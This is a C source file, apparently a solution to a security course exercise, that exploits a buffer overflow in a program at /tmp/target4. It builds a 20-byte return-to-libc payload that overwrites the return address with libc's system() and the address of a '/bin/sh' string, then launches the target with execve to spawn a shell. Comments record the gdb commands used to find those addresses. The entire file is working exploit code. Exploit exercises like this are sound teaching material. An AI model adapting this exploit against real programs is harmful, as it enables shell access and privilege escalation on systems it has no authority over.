#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

char payload[20];

int main(void) {


/*
p system
	$1 = {<text variable, no debug info>} 0xb7e54da0 <__libc_system>

info proc map
	0xb7e1a000 0xb7fca000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so
	0xb7fca000 0xb7fcc000     0x2000   0x1af000 /lib/i386-linux-gnu/libc-2.23.so
	0xb7fcc000 0xb7fcd000     0x1000   0x1b1000 /lib/i386-linux-gnu/libc-2.23.so

find 0xb7e1a000,0xb7fcd000,"/bin/sh"
        0xb7f75a0b
        1 pattern found.

x/s 0xb7f75a0b
0xb7f75a0b:	"/bin/sh"

*/


  // first 4+4 could be 0x90 (buffer + ebp)
  // next 4 should be system() (eip)
  // next 4 could be 0x90
  // next 4 shoud be /bin/sh
  int i;
  for(i=0;i<8;i++) payload[i] = 0x90;


  //0xb7e54da0
  payload[8] = 0xa0;
  payload[9] = 0x4d;
  payload[10] = 0xe5;
  payload[11] = 0xb7;

 for(i=12;i<16;i++) payload[i] = 0x90;

  // 0xb7f75a0b
  payload[16] = 0x0b;
  payload[17] = 0x5a;
  payload[18] = 0xf7;
  payload[19] = 0xb7;

  char *args[] = { TARGET, payload,  NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
